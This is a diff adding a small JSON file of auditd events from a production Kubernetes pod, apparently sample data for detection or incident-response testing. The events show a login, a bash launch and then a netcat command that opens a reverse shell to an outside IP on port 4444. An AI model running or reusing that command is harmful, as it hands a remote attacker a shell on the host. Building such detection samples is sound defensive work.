@@ -1,0 +1,50 @@
+
+[
+  {
+    "source": "auditd",
+    "timestamp": "2026-04-26T14:01:02.184Z",
+    "event_type": "USER_LOGIN",
+    "uid": 1000,
+    "auid": 1000,
+    "user": "ubuntu",
+    "src_ip": "10.0.0.8",
+    "k8s": {
+      "pod": "web-app-7f9c8d4c5b-xk92l",
+      "namespace": "production"
+    }
+  },
+
+  {
+    "source": "auditd",
+    "timestamp": "2026-04-26T14:01:05.441Z",
+    "event_type": "EXECVE",
+    "uid": 1000,
+    "auid": 1000,
+    "user": "ubuntu",
+    "pid": 4210,
+    "ppid": 4001,
+    "process": "bash",
+    "command": "/bin/bash",
+    "k8s": {
+      "pod": "web-app-7f9c8d4c5b-xk92l",
+      "namespace": "production"
+    }
+  },
+
+  {
+    "source": "auditd",
+    "timestamp": "2026-04-26T14:01:09.772Z",
+    "event_type": "EXECVE",
+    "uid": 1000,
+    "auid": 1000,
+    "user": "ubuntu",
+    "pid": 4217,
+    "ppid": 4210,
+    "process": "nc",
+    "command": "nc 185.77.12.44 4444 -e /bin/bash",
+    "k8s": {
+      "pod": "web-app-7f9c8d4c5b-xk92l",
+      "namespace": "production"
+    }
+  }
+]
